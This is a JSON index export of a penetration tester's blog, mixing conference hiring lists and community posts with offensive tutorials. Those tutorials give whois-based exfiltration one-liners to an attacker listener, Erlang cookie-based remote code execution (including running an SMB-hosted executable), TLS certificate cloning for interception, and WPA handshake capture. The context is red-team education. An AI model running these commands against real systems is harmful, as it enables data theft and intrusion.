Edition","uri":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/"},{"categories":null,"content":"21. What differentiates good red teamers from the pack as far as approaching a problem differently? In my opinion, the most significant differentiator from people that I have seen as successful versus not is the ability to ask for help. The ability to ask for help is not as natural as it sounds. When you are knee-deep in a network or security vulnerability, it’s hard to ask for help or let people into your “secret sauce.” Letting go of that pride allows red teamers to go further, learn more, and be more successful overall. ","date":"2019-08-19","objectID":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/:21:0","tags":["tribe of hackers","book"],"title":"Tribe of Hackers: Red Team Edition","uri":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/"},{"categories":null,"content":"Created the 2019 UNOFFICIAL DerbyCon Hiring List. To get on the list just complete the following form: https://forms.gle/h7dXtd5vLs3k6EBRA One small tip, first come first serve, so if you want to be on the top of the list it’s best to submit the best info you have vs waiting on anyone to fill in more details, I don’t change the list order for anyone, but will definitely update your listing if asked. Direct Link to the Hiring List Google Doc: https://docs.google.com/spreadsheets/d/17rIF_3dcqhPU1Ybck5lRhqT3vo4EOiXN0NHmuJHShGY/ ","date":"2019-08-18","objectID":"https://malicious.link/posts/2019/2019-derbycon-hiring-list/:0:0","tags":["derbycon","hiring"],"title":"2019 DerbyCon Hiring List","uri":"https://malicious.link/posts/2019/2019-derbycon-hiring-list/"},{"categories":null,"content":"Created the 2019 UNOFFICIAL BlackHat, DEF CON, BSidesLV Hiring List. To get on the list is even easier now! Just complete the following form: https://forms.gle/skaksvub8ijTELub8 (One small tip, first come first serve, so if you want to be on the top of the list it’s best to submit the best info you have vs waiting on anyone, I don’t change the list order for anyone.) Direct Link to the Hiring List Google Doc: https://docs.google.com/spreadsheets/d/1Sxk5qAKH54Yg_wo5XHygHZYiIJhlLFzVfc0MBbdQg2I/ ","date":"2019-07-20","objectID":"https://malicious.link/posts/2019/2019-bhdcbslv-hiring-list/:0:0","tags":["blackhat","defcon","bsideslv","hiring"],"title":"2019 BH/DC/BSidesLV Hiring List","uri":"https://malicious.link/posts/2019/2019-bhdcbslv-hiring-list/"},{"categories":null,"content":"A little history A couple months ago @carnal0wnage, @bsdbandit and @theblindhacker (I’m sure I’ll get corrected if I’m wrong here) were at NoVAHackers just talking in the parking lot after the event and thought that it would be nice if they didn’t have to wait a month to have conversations like they were having each month out in the parking lot after the events. In passing @carnal0wnage told me about this and I set out to make it happen (for selfish reasons, I wanted to talk to them too). ","date":"2019-05-24","objectID":"https://malicious.link/posts/2019/grumpy-hackers/:0:1","tags":["grumpyhackers"],"title":"Grumpy Hackers","uri":"https://malicious.link/posts/2019/grumpy-hackers/"},{"categories":null,"content":"What is it? It’s a conversation, just like we had in the parking lot. Each week on Wednesday night at 9:15 PM EST a group of “Grumpy Hackers” get on Discord and talk like we would outside of NoVAHackers. We just so happen to also stream the entire conversation to Twitch ","date":"2019-05-24","objectID":"https://malicious.link/posts/2019/grumpy-hackers/:0:2","tags":["grumpyhackers"],"title":"Grumpy Hackers","uri":"https://malicious.link/posts/2019/grumpy-hackers/"},{"categories":null,"content":"Who’s invited? How do I get on the show? Everyone is invited to participate in whatever way they wish. Here are some ways going from least involved to most: Just watch/listen to the show on Twitch Just watch/listen to the show on Discord Chat with us during the show in Twitch/Discord Hit us up on Twitter about the links or submitting your own for us to talk about via @GrumpyHackers Ask us to have a certain guest on the show via Twitch chat / Discord chat / or Twitter Talk to us in the “#pre-show-chat” room before the show Join the show. You don’t have to say a thing if you don’t want to but we do have a fuzzy rule that everyone on the show must bring a topic or link to discuss. To join the Discord just click on the image below: For those who don’t know, Discord is a lot like Slack but it has built in voice channels like TeamSpeak or similar software (this makes it very easy to get people together without having to share Skype usernames or set up a call.) ","date":"2019-05-24","objectID":"https://malicious.link/posts/2019/grumpy-hackers/:1:0","tags":["grumpyhackers"],"title":"Grumpy Hackers","uri":"https://malicious.link/posts/2019/grumpy-hackers/"},{"categories":null,"content":"When? Every Wednesday, at around 8:45 - 8:50 people start showing up in the “#pre-show-chat” voice channel so we can BS, talk about what topics we have for the night and get an idea of who’s going to stream. We start the stream around 9:15ish and it goes until we run out of things to talk about or everyone gets tired and wants to go to bed. ","date":"2019-05-24","objectID":"https://malicious.link/posts/2019/grumpy-hackers/:2:0","tags":["grumpyhackers"],"title":"Grumpy Hackers","uri":"https://malicious.link/posts/2019/grumpy-hackers/"},{"categories":null,"content":"Do I have to stay for the whole show? ","date":"2019-05-24","objectID":"https://malicious.link/posts/2019/grumpy-hackers/:3:0","tags":["grumpyhackers"],"title":"Grumpy Hackers","uri":"https://malicious.link/posts/2019/grumpy-hackers/"},{"categories":null,"content":"Do I have to be there for the start of the show? No. There is ZERO specific structure to the show. It’s a conversation among friends, colleagues, etc. You are more than welcome to join in 15 minutes late, go take care of something and then join in another hour later. We do have a few rules about the show if you choose to join us via chat or on the show: Familiarize yourself with the Twitch Community Guidelines. Above all, keep chat wholesome, respectful, and fun. Here’s a detailed list of rules. No insults, hate speech, or disrespectful comments. Talking down to other viewers unironically is not acceptable. No political or religious discussion, unless VERY topical (e.g. The second coming of Christ is happening how do you feel?) No elitism/toxicity towards other players of certain heroes or console/PC players (You can hate Mercy, but don’t hate Mercy players.) No dramatic streamer/esports topics or disrespectful comments on other players or streamers. Do not bring “toaster this guy said you suck on his stream” comments here. (Don’t bring any to others either.) Memes and occasional spam is okay, but do not RUIN THE CHAT EXPERIENCE for any longer than a minute. Do not blatantly (or subtly “I STREAM BTW”) promote streams. There is a discord channel for this so it doesn’t have to be in chat. Don’t pressure me into doing things you want like I’m some entertainment monkey (singing/dancing/playing specific game/duoing with specific player.) Suggestions and memes are fine, but don’t overdo it. No unsolicited sub gift requests. If you accidentally break a rule and get timed out, don’t get all up in arms about it. Just chill and come back, we don’t hate you. NO SUPER EDGY JOKES. Any distasteful or insensitive comments are subject to moderation. Respect other people in the stream. If they are clearly breaking ToS then it’s fine to point it out and laugh, but don’t make fun of people or randomly say “this person sucks lol” for no reason. Rules respectfully borrowed from eviltoaster ","date":"2019-05-24","objectID":"https://malicious.link/posts/2019/grumpy-hackers/:4:0","tags":["grumpyhackers"],"title":"Grumpy Hackers","uri":"https://malicious.link/posts/2019/grumpy-hackers/"},{"categories":null,"content":"Twitch So, please subscribe / follow: Twitch Link: https://www.twitch.tv/GrumpyHackers Twitter Link: https://twitter.com/GrumpyHackers Discord Link: https://discord.gg/k2JaSbw Thanks! And we’ll see you on the show! Now, GET OFF OUR LAWN!!! ","date":"2019-05-24","objectID":"https://malicious.link/posts/2019/grumpy-hackers/:5:0","tags":["grumpyhackers"],"title":"Grumpy Hackers","uri":"https://malicious.link/posts/2019/grumpy-hackers/"},{"categories":null,"content":"Unfortunately the updated theme broke my RSS feed. I think I have it fixed so that it correctly links to the site but I am still having issues with it. If you wish to subscribe to this blog I would highly recommend using the FeedBurner link. The one on the site has changed over 10 years many times while the FeedBurner link never does. I keep updating what URL the FeedBurner link points to when I switch platforms. Apologize for the issues and linking currently going on. RSS Feed: https://malicious.link/index.xml FeedBurner Link: https://feeds.feedburner.com/Room362com ","date":"2019-05-23","objectID":"https://malicious.link/posts/2019/rss-feed-fix/:0:0","tags":["rss"],"title":"RSS Feed Fix","uri":"https://malicious.link/posts/2019/rss-feed-fix/"},{"categories":null,"content":"If you have never played Code Golf before, the essential idea is that you take a programming goal, such as “Print all prime numbers from 1 to 100”, and then try to do so in the most efficient / least amount of lines possible. There is a great website where these challenges can be found: https://code-golf.io/ I enjoy playing code golf, so when I saw the following tweet, I had to try it out: The tweet 1102558893513687040 from @Kevin2600 was deleted but it had the following commands in the image: (making up an IP since it was blacked out): Victim: whois -h 10.110.10.81 -p 4444 `cat /etc/passwd | base64` Attacker: nc -l -p 4444 Now, a lot of respondents mentioned that you could use the /dev/tcp method or awk. Why whois? TCPhttps://t.co/6UstTUeJ4M awkhttps://t.co/QlCoAXFvKh Much easier and faster! — Malwrologist (@DissectMalware) March 5, 2019\rWhile this is awesome and true, and for practicality should be used instead of whois, it is more about the mental stretch and exercise for me. You never know, there might a situation where you can’t use either of those and whois is still there. This is the solution I came up with to both increase the file size limit, and add a bit of error correction: (Here is my reply: https://twitter.com/mubix/status/1102780435271176198) ","date":"2019-05-20","objectID":"https://malicious.link/posts/2019/bash-golf-with-whois/:0:0","tags":["bash","whois","netcat","ncat","xargs","tee"],"title":"Bash Golf with Whois","uri":"https://malicious.link/posts/2019/bash-golf-with-whois/"},{"categories":null,"content":"First we set up a listener: root@attackbox:~# ncat -k -l -p 4444 | tee files.b64 tee is used to pipe the contents to a file as well as see it on the console so you can make sure you have it. You can substitute this with just \u003e files.b64 if you wish. Options: -k: means keep the connection open. We need this option as we are going to be doing many requests with whois -l: listen on a port.. and -p: what port to listen on ","date":"2019-05-20","objectID":"https://malicious.link/posts/2019/bash-golf-with-whois/:0:1","tags":["bash","whois","netcat","ncat","xargs","tee"],"title":"Bash Golf with Whois","uri":"https://malicious.link/posts/2019/bash-golf-with-whois/"},{"categories":null,"content":"Next we send the files over the wire: root@victim:~# tar czf - /bin/* | base64 | xargs -I bits timeout 0.03 whois -h 192.168.80.107 -p 4444 bits Breakdown: tar czf - /bin/*: Create a tar ball using compression(c), and gzip(z) to the file(f) of standard output(-) using all of the files in the bin folder (/bin/*) base64: Base64 encode that standard output xargs -I bits: for every line do the following command while replacing the word bits in the command with the contents of the preceding lines (from the base64) timeout 0.03: This times out the whois command so that it closes the connection because there isn’t a response from the other end (it’s just capturing packets). This is REALLY fast and only should be used in LAN connections. Set the timeout to 0.10 or similar for doing things across the Internet. whois -h 192.168.80.107 -p 4444 bits: Send the bits(which is replaced with the base64 line) whois query to 192.168.80.107 over port 4444. What you should see on the attacker side is a bunch of Base64 lines scrolling across the screen. ","date":"2019-05-20","objectID":"https://malicious.link/posts/2019/bash-golf-with-whois/:0:2","tags":["bash","whois","netcat","ncat","xargs","tee"],"title":"Bash Golf with Whois","uri":"https://malicious.link/posts/2019/bash-golf-with-whois/"},{"categories":null,"content":"Finally: root@attackbox:~# cat files.b64 | tr -d '\\r\\n' | base64 -d | tar zxv Breakdown: cat files.b64: print all the base64 lines to standard output tr -d '\\r\\n': remove all the newlines and returns to make one long base64 line to decode base64 -d: decode the base64 line tar zxv: x extract the tar ball using z gzip and be v verbose about it. ","date":"2019-05-20","objectID":"https://malicious.link/posts/2019/bash-golf-with-whois/:0:3","tags":["bash","whois","netcat","ncat","xargs","tee"],"title":"Bash Golf with Whois","uri":"https://malicious.link/posts/2019/bash-golf-with-whois/"},{"categories":null,"content":"Errors: If you receive a base64: invalid input when doing the final step it is most likely that your timeout was too fast and some of the lines didn’t transfer completely. If you get something like the following you have had some corruption during the transfer. This can happen and does so a lot during such a long transfer (13 MB took 98 minutes as you’ll see below). bin/bash bin/brltty gzip: stdin: invalid compressed data--format violated tar: Unexpected EOF in archive tar: Unexpected EOF in archive tar: Error is not recoverable: exiting now ","date":"2019-05-20","objectID":"https://malicious.link/posts/2019/bash-golf-with-whois/:0:4","tags":["bash","whois","netcat","ncat","xargs","tee"],"title":"Bash Golf with Whois","uri":"https://malicious.link/posts/2019/bash-golf-with-whois/"},{"categories":null,"content":"Improvements: Speed: One improvement to the speed is the number of bytes you send with each whois request, which is based on the line length of the base64 output with the -w flag. I have been able to increase this to 255 without much trouble like so: base64 -w255 Example: tar czf - /bin/* | base64 -w255 | xargs -I bits timeout 0.20 whois -h 192.168.80.107 -p 4444 bits Even with this speed up sending all of /bin/ took 98 minutes using a timeout of 0.20. You can decrease this considerably depending on the network connection you have between the victim and attackerbox, but you need to be careful or you’ll end up with corrupted data if you go too fast. Size of /bin/: root@victim:~# du -h /bin/ 13M /bin/ Total time: root@victim:~# time tar czf - /bin/* | base64 -w 255 | xargs -I bits timeout 0.20 whois -h 192.168.80.107 -p 4444 bits real 98m7.673s user 1m25.792s sys 0m46.706s Encryption: While adding encryption will add more complexity and size to the transfer it will ensure confidentiality of the data being transfered. Simply adding openssl enc -e -aes256 -out - to the line before the base64 works to solve this (as long as you select a good password). You will also need a full TTY (interactive terminal) to do this as it will prompt you for a password twice. Example: tar czf - /bin/* | openssl enc -e -aes256 -out - | base64 -w 255 | xargs -I bits timeout 0.20 whois -h 192.168.80.107 -p 4444 bits ","date":"2019-05-20","objectID":"https://malicious.link/posts/2019/bash-golf-with-whois/:0:5","tags":["bash","whois","netcat","ncat","xargs","tee"],"title":"Bash Golf with Whois","uri":"https://malicious.link/posts/2019/bash-golf-with-whois/"},{"categories":null,"content":"Challenge Think you can make this more efficient? Add error correction? I would love to see tweets or comments stating where this can be improved using only built in binaries (no python/ruby/perl/awk). Let me know! I look forward to hearing from you. ","date":"2019-05-20","objectID":"https://malicious.link/posts/2019/bash-golf-with-whois/:1:0","tags":["bash","whois","netcat","ncat","xargs","tee"],"title":"Bash Golf with Whois","uri":"https://malicious.link/posts/2019/bash-golf-with-whois/"},{"categories":null,"content":"Other methods For those looking for a lot more file uploads or other such exploitation techniques, check out GTFOBins and in particular https://gtfobins.github.io/#+file%20upload. whois is detailed here: https://gtfobins.github.io/gtfobins/whois/ ","date":"2019-05-20","objectID":"https://malicious.link/posts/2019/bash-golf-with-whois/:2:0","tags":["bash","whois","netcat","ncat","xargs","tee"],"title":"Bash Golf with Whois","uri":"https://malicious.link/posts/2019/bash-golf-with-whois/"},{"categories":null,"content":"A co-worker referenced a pretty cool tool released by @SalesForce’s security team called “VulnReport” I wanted to try it out so I checked out their Github report to start the install: https://github.com/salesforce/vulnreport - but there really wasn’t much in the way of documentation on how to get it rolling unless you were deploying it to a Heroku app. I’m not really a fan of putting vulnerability information, especially Red Team findings into the cloud so I decided to deploy it locally. Here are the steps I went through to install it and get it up and running: Note: I started with a Debian 9.3 ISO that I had on-hand, if you use another repo your mileage may vary. Install dependancies: This project uses Ruby, and many of the gems needed for the project require compiling in libraries. apt install -y git ruby ruby-dev ruby-bundler build-essential libssl-dev libpq-dev zlib1g-dev postgresql-server-dev-all authbind Next we install a Redis and Postgres server. If you already have these on the system or wish to use an established server on another systems you can most definitely do that instead of this step. apt install -y redis-server postgresql Setup Database Next we just need to create the database and user we will be using for the database: root@vulnreportio:~# su - postgres postgres@vulnreportio:~$ createuser -P vulnreportuser Enter password for new role: vulnreportpassword (NOT DISPLAYED) Enter it again: vulnreportpassword (NOT DISPLAYED) postgres@vulnreportio:~$ createdb -O vulnreportuser vulnreportdb postgres@vulnreportio:~$ exit logout root@vulnreportio:~# Clone the repo Toss the repo in /opt/ so that we can run this under another user to better secure it later but just for example we’ll get this running as root. root@vulnreportio:~# cd /opt/ root@vulnreportio:/opt# git clone https://github.com/salesforce/vulnreport Cloning into 'vulnreport'... remote: Enumerating objects: 1191, done. remote: Total 1191 (delta 0), reused 0 (delta 0), pack-reused 1191 Receiving objects: 100% (1191/1191), 2.93 MiB | 3.92 MiB/s, done. Resolving deltas: 100% (694/694), done. root@vulnreportio:/opt# cd vulnreport/ root@vulnreportio:/opt/vulnreport# Setup Ruby At the current version the Ruby version is fixed to 2.1.2 but works just fine with later versions so you can remove the fixed Ruby version in the Gemfile: root@vulnreportio:/opt/vulnreport# bundle install Don't run Bundler as root. Bundler can ask for sudo if it is needed, and installing your bundle as root will break this application for all non-root users on this machine. Your Ruby version is 2.3.3, but your Gemfile specified 2.1.2 Just comment out the line and things should work: root@vulnreportio:/opt/vulnreport# bundle install Don't run Bundler as root. Bundler can ask for sudo if it is needed, and installing your bundle as root will break this application for all non-root users on this machine. Fetching gem metadata from https://rubygems.org/.............. Fetching version metadata from https://rubygems.org/... Fetching dependency metadata from https://rubygems.org/.. Installing i18n 0.7.0 Using json 1.8.3 Installing minitest 5.8.4 Installing thread_safe 0.3.5 Installing addressable 2.4.0 Installing builder 3.2.2 Installing mini_portile2 2.0.0 Installing bcrypt 3.1.11 with native extensions Installing chronic 0.10.2 Installing daemons 1.2.3 Installing fastercsv 1.5.5 Installing json_pure 1.8.3 Installing multi_json 1.11.3 Installing stringex 1.5.1 Installing uuidtools 2.1.5 Installing dotenv 2.1.1 Installing eventmachine 1.0.7 with native extensions Installing multi_xml 0.5.5 Installing rack 1.6.4 Installing systemu 2.6.5 Installing mime-types-data 3.2016.0221 Installing multipart-post 2.0.0 Installing nori 2.6.0 Installing oauth 0.5.1 Installing pdfkit 0.8.2 Installing pg 0.18.4 with native extensions Installing redis 3.3.0 Installing rubyzip 1.2.0 Installing rufus-scheduler 3.2.0 Installing tilt 2.0.2 Installing wkhtmltopdf-heroku 2.12.3.0 Installing xml-simple 1.1.5 Installing yard ","date":"2019-02-28","objectID":"https://malicious.link/posts/2019/vulnreport-install/:0:0","tags":["redteam","reporting"],"title":"VulnReport Install","uri":"https://malicious.link/posts/2019/vulnreport-install/"},{"categories":null,"content":"Created the 2018 UNOFFICIAL ShmooCon Hiring List. To get on the list is even easier now! Just complete the following form: https://goo.gl/forms/I4sbeEpxMwNI6qn33 (One small tip, first come first serve, so if you want to be on the top of the list it’s best to submit the best info you have vs waiting on anyone, I don’t change the list order for anyone.) Direct Link to the Hiring List Google Doc: https://docs.google.com/spreadsheets/d/1HnDVbXqQU74X8RyLdTPZ36ZPlbpXYk5ByO1uw55eWI0/ ","date":"2018-12-15","objectID":"https://malicious.link/posts/2018/2019-shmoocon-hiring-list/:0:0","tags":["shmoocon","hiring"],"title":"2019 ShmooCon Hiring List","uri":"https://malicious.link/posts/2018/2019-shmoocon-hiring-list/"},{"categories":null,"content":"I have a bit of a feature request for all wireless assessment tools out there: Many times before arriving on site for an assessment, I’ll know the ESSIDs of a target wireless network for a client. Getting channels and BSSIDs isn’t usually an option. Also, many times during the assessment I’m performing there are physical aspects to it, like guards or cameras, so sitting down in the lobby and typing out commands to De-auth that client or BSSID isn’t really great OPSEC. SO this is my ask: Please make a mode or setting where I can specify a ESSID ahead of time (so I am only targeting the client networks I know of) that I can just leave running on a RaspberryPI or other small device + wireless card in my backpack. This mode would then search for WPA-PSK APs with that name, find ones with clients on it by hopping, deauth and try to capture the handshake, but would then go-back to hopping after a few minutes if failing (as I’m probably walking around the inside and outside of the building). A nice to have would that it would then exclude that network from the list provided and move on. Possibly also going after the ones with the most clients in the list automatically would be a plus as well. The end result would be that I would have a couple WPA handshakes that I could then crack off-line just by walking around the building doing other things. The key to this whole thing is not to get stuck on a single BSSID or client, and be able to reliably move on to another channel, BSSID or target ESSID without interaction. Let the WPA Handshake Hunting begin! ","date":"2018-10-14","objectID":"https://malicious.link/posts/2018/wifi-feature-request-wpa-handshakes/:0:0","tags":["wireless","wpa","bettercap","kismet","pineapple"],"title":"Wifi Feature Request: WPA handshakes","uri":"https://malicious.link/posts/2018/wifi-feature-request-wpa-handshakes/"},{"categories":null,"content":"Erlang is a programming language that I have tried to learn a few times in the past but never really dug in, that is, until recently. Erlang is an interesting language because it has “built-in concurrency, distribution, and fault tolerance”. To me, this means that it does job queuing and distributed tasks right out of the gate. ","date":"2018-09-15","objectID":"https://malicious.link/posts/2018/erlang-arce/:0:0","tags":["erlang","rce","solarwinds","rabbitmq"],"title":"Erlang Authenticated Remote Code Execution","uri":"https://malicious.link/posts/2018/erlang-arce/"},{"categories":null,"content":"A little bit of history I first started digging into Erlang again from an attackers point of view at BSides Philadelphia 2016, where I talked about SolarWinds ORION. I was in the audience making last minute changes to my slides when I happened upon an “erlang-node” port (25672) listening. You can watch the video here (I’ve jumped ahead to the part about the Erlang port): After I gave that talk, I asked around NoVA Hackers. Luckily one such individual did, and that’s why I love what NoVA Hackers has grown into, but this post isn’t about that. With a little bit of back and forth with what I was trying to accomplish, we worked out the needed requirements for code execution. ","date":"2018-09-15","objectID":"https://malicious.link/posts/2018/erlang-arce/:0:1","tags":["erlang","rce","solarwinds","rabbitmq"],"title":"Erlang Authenticated Remote Code Execution","uri":"https://malicious.link/posts/2018/erlang-arce/"},{"categories":null,"content":"Erlnag Nodes Erlang uses “Nodes” to execution code. As far as I can tell (and I’ll probably be corrected) but you must run a node to execute any Erlang code, so everything written in Erlang (RabbitMQ, CouchDB, etc.) must be running a node. Erlang nodes are identified by their hostname. For my SolarWinds box, it’s WIN-PM0ID6F0AHN. This is the most straightforward piece of information to acquire for the authenticated RCE. ","date":"2018-09-15","objectID":"https://malicious.link/posts/2018/erlang-arce/:0:2","tags":["erlang","rce","solarwinds","rabbitmq"],"title":"Erlang Authenticated Remote Code Execution","uri":"https://malicious.link/posts/2018/erlang-arce/"},{"categories":null,"content":"The Cookie The Erlang cookie SHOULD be the hardest to acquire. It’s essentially the shared secret password between nodes, and just a simple string. This cookie exists even if only a single node is spun up (such is the case for SolarWinds). It is most commonly stored in a file called .erlang.cookie with nothing in the file other than the string. You can find it in home directories, userprofiles, project files and such. On Linux, it begining with the . means that it’s automatically a “hidden” file, but on Windows it doesn’t mean much ;). RabbitMQ documents well where the key is located: https://www.rabbitmq.com/clustering.html#erlang-cookie Example .erlang.cookie file: rabbit One Windows for Solar Winds it can be found in Program Data: ","date":"2018-09-15","objectID":"https://malicious.link/posts/2018/erlang-arce/:0:3","tags":["erlang","rce","solarwinds","rabbitmq"],"title":"Erlang Authenticated Remote Code Execution","uri":"https://malicious.link/posts/2018/erlang-arce/"},{"categories":null,"content":"The Cluster Name The cluster name is needed to join the cluster but this is more of a guessing game. However, luckily these are regularly named based on the service being offered. RabbitMQ in particular almost always has a cluster name of rabbit. ","date":"2018-09-15","objectID":"https://malicious.link/posts/2018/erlang-arce/:0:4","tags":["erlang","rce","solarwinds","rabbitmq"],"title":"Erlang Authenticated Remote Code Execution","uri":"https://malicious.link/posts/2018/erlang-arce/"},{"categories":null,"content":"The Node Port This is actually pretty interesting that I haven’t dived into completely yet, but the port isn’t specified or default. There is some sort of discovery process so no matter the port the nodes are running on Erlang is able t find it. In the case of SolarWinds Orion’s RabbitMQ, its 25672 but I’ve seen erlang nodes on a number of other ports, usually particular to the project it’s being run for. ","date":"2018-09-15","objectID":"https://malicious.link/posts/2018/erlang-arce/:0:5","tags":["erlang","rce","solarwinds","rabbitmq"],"title":"Erlang Authenticated Remote Code Execution","uri":"https://malicious.link/posts/2018/erlang-arce/"},{"categories":null,"content":"Remote Code Execution A simple apt install erlang gets you ready for exectuion. Once installed you need to put your .erlang.cookie file in your home directory ~/. You also need to resolve the hostname (Node name) you wil be connecting to. Then it’s just running a couple commands: test is the node name you’ll be calling your attack box when connecting to the cluster rabbit is the cluster name being connected to WIN-PM0ID6F0AHN is the hostname I’m connecting to the cluster via Start up Erlang with erl -sname test: root@kali:~# erl -sname test Erlang/OTP 18 [erts-7.3.1.2] [source] [64-bit] [async-threads:10] [kernel-poll:false] Eshell V7.3.1.2 (abort with ^G) (test@kali)1\u003e Connecting to the cluster (the period on the end of the commands important terminators): (test@kali)1\u003e net_kernel:connect('rabbit@WIN-PM0ID6F0AHN'). true If you get a true that means the connection was successful. Code exeuction (starting calc of course): (test@kali)2\u003e erlang:spawn('rabbit@WIN-PM0ID6F0AHN',os,cmd,[\"calc.exe\"]). \u003c6867.30570.461\u003e And so, like any good code execution attack, calc.exe is executed: On Windows of course you can even do SMB shares: erlang:spawn('rabbit@WIN-PM0ID6F0AHN',os,cmd,[\"\\\\\\\\192.168.80.69\\\\share\\\\runme.exe\"]). Exiting the Erlang Shell is done with the init::stop function: (test@kali)3\u003e init:stop(). ok (test@kali)4\u003e root@kali:~# Warning: By running this code execution method you are running a node as well, as as long as you have the connection open, you can be exploited the same way you are exploiting the remote host. ","date":"2018-09-15","objectID":"https://malicious.link/posts/2018/erlang-arce/:0:6","tags":["erlang","rce","solarwinds","rabbitmq"],"title":"Erlang Authenticated Remote Code Execution","uri":"https://malicious.link/posts/2018/erlang-arce/"},{"categories":null,"content":"The Bad, and the worse… In many Docker instances the .erlang.cookie file is statically assigned and easy to find in the code. This is incredibly dangerous to have a statically assigned Erlang cookie for anyone who uses your Docker image, however because Docker doesn’t automatically expose ports from the docker instance, this is actually a better scenario in many cases than running the erlang project without containers. This is not always the case and just like private keys on github, really easy to find: Searching for .erlang.cookie on Github: ","date":"2018-09-15","objectID":"https://malicious.link/posts/2018/erlang-arce/:0:7","tags":["erlang","rce","solarwinds","rabbitmq"],"title":"Erlang Authenticated Remote Code Execution","uri":"https://malicious.link/posts/2018/erlang-arce/"},{"categories":null,"content":"The Ugly Changing the Erlang Cookie is a pain, and usually very deep in the project or setup, so once you have the file, you have future proof code execution. ","date":"2018-09-15","objectID":"https://malicious.link/posts/2018/erlang-arce/:0:8","tags":["erlang","rce","solarwinds","rabbitmq"],"title":"Erlang Authenticated Remote Code Execution","uri":"https://malicious.link/posts/2018/erlang-arce/"},{"categories":null,"content":"Created the 2018 UNOFFICIAL Kiwicon Hiring List. To get on the list is even easier now! Just complete the following form: https://goo.gl/forms/hfftscOGBWp14Ust1 (One small tip, first come first serve, so if you want to be on the top of the list it’s best to submit the best info you have vs waiting on anyone, I don’t change the list order for anyone.) Direct Link to the Hiring List Google Doc: https://docs.google.com/spreadsheets/d/1q_qBbtBkbNNEmOoLkayW4GoMRXbMGIC3JyK0g9ML9fw/ ","date":"2018-09-09","objectID":"https://malicious.link/posts/2018/2018-kiwicon-hiring-list/:0:0","tags":["kiwicon","hiring"],"title":"2018 KiwiCon Hiring List","uri":"https://malicious.link/posts/2018/2018-kiwicon-hiring-list/"},{"categories":null,"content":"Created the 2018 UNOFFICIAL DerbyCon Hiring List. To get on the list is even easier now! Just complete the following form: https://goo.gl/forms/K6kfOY5dHH6lcQm63 (One small tip, first come first serve, so if you want to be on the top of the list it’s best to submit the best info you have vs waiting on anyone, I don’t change the list order for anyone.) Direct Link to the Hiring List Google Doc: https://docs.google.com/spreadsheets/d/11J2oqGndmBB7mFoc_JfpMGv6S41UZRcTi7NByjavHBU/ ","date":"2018-09-01","objectID":"https://malicious.link/posts/2018/2018-derbycon-hiring-list/:0:0","tags":["derbcyon","hiring"],"title":"2018 DerbyCon Hiring List","uri":"https://malicious.link/posts/2018/2018-derbycon-hiring-list/"},{"categories":null,"content":"At Def Con 26, @singe and @_cablethief gave a talk on enterprise wireless attacks. When it’s video is released you should check it out. During that talk, they quickly touched on a tool written by Rogan Dawes another @Sensepost-er’s tool called “Apostille”. It is esentially a certificate stealing (cloning? faking? doppelganger-ing?) tool. However, that over simplifies what it does. To be more accurate, Apostille generates a clone of the certificate chain, identical in as many details as possible, apart from the actual key values. One thing this could be useful for is bypassing naive cert pinning if the validation is based on details of the signing certs. — @RoganDawes@infosec.exchange (@RoganDawes) August 26, 2018 Copying a certificate’s common name, email, or other fields that are inputted during creation is a relatively easy way to copy certificates, and they can look relatively good at first glance. However, this simple copy leads to many tell-tail signs that it’s fake. For instance lets say I create a certificate like so: root@apostille-post:~# openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout mycert.pem -out mycert.pem Generating a 2048 bit RSA private key .................................................................................................................+++ ...+++ writing new private key to 'mycert.pem' ----- You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter '.', the field will be left blank. ----- Country Name (2 letter code) [AU]:US State or Province Name (full name) [Some-State]:California Locality Name (eg, city) []:Mountain View Organization Name (eg, company) [Internet Widgits Pty Ltd]:Google LLC Organizational Unit Name (eg, section) []: Common Name (e.g. server FQDN or YOUR name) []:*.google.com Email Address []: If I host it out, here are the results side by side with Google.com: The Vaild From, the Issued By, and most of the other certificate information helps this certificate to stand out as fraudulent. Also, doing this by hand is a PITA. Enter Apostille. It’s pretty straight forward to get it going, but you do need both Java’s JDK and Maven to compile it first: root@apostille-post:~# apt install -y maven default-jdk git (I’m doing this on a fresh box so it needed git as well) Step 2, git clone the repo, and compile with Maven: root@apostille-post:~# git clone https://github.com/sensepost/apostille Cloning into 'apostille'... remote: Counting objects: 48, done. remote: Total 48 (delta 0), reused 0 (delta 0), pack-reused 48 Unpacking objects: 100% (48/48), done. root@apostille-post:~# cd apostille/ root@apostille-post:~/apostille# mvn package Step 3, Clone your first certificate: java -jar target/apostille-1.0-SNAPSHOT.jar google.com:443 tempkeystore.jks ASDqwe123 ASDqwe123 google.com:443 is the endpoint that will serve a certificate chain back, this isn’t regulated to only HTTPS, but any TLS endpoint. tempkeystore.jks is the Java Keystore file that we will putting the certificate chain into. ASDqwe123 is the kspassword and then the keypassword (Keystore and certificate password) - I just made them the same as this is an example and I won’t be using the keystore for anything but to export the certificates later. In order to get the certificates out of the keystore and into a PEM format that I can use for testing, I used the following: Source: https://www.calazan.com/how-to-convert-a-java-keystore-jks-to-pem-format/ root@apostille-post:~/apostille# keytool -importkeystore -srckeystore tempkeystore.jks -destkeystore myapp.p12 -srcalias *.google.com -srcstoretype jks -deststoretype pkcs12 Importing keystore tempkeystore.jks to myapp.p12...Enter destination keystore password: ASDqwe123 Re-enter new password: ASDqwe123 Enter source keystore password: ","date":"2018-08-26","objectID":"https://malicious.link/posts/2018/stealing-certificates-with-apostille/:0:0","tags":["certificates","mitm"],"title":"Stealing Certificates with Apostille","uri":"https://malicious.link/posts/2018/stealing-certificates-with-apostille/"},{"categories":null,"content":"Created the 2018 UNOFFICIAL BlackHat, DEF CON, BSidesLV Hiring List. To get on the list is even easier now! Just complete the following form: https://goo.gl/forms/dIjQHTPLk7ZYyv5D2 (One small tip, first come first serve, so if you want to be on the top of the list it’s best to submit the best info you have vs waiting on anyone, I don’t change the list order for anyone.) Direct Link to the Hiring List Google Doc: https://docs.google.com/spreadsheets/d/13szhdt08HqmvV1pxZbrBzoYv8pe0vpvT-z9w-XTcEKw/ ","date":"2018-07-27","objectID":"https://malicious.link/posts/2018/2018-bhdcbslv-hiring-list/:0:0","tags":["blackhat","defcon","bsideslv","hiring"],"title":"2018 BH/DC/BSidesLV Hiring 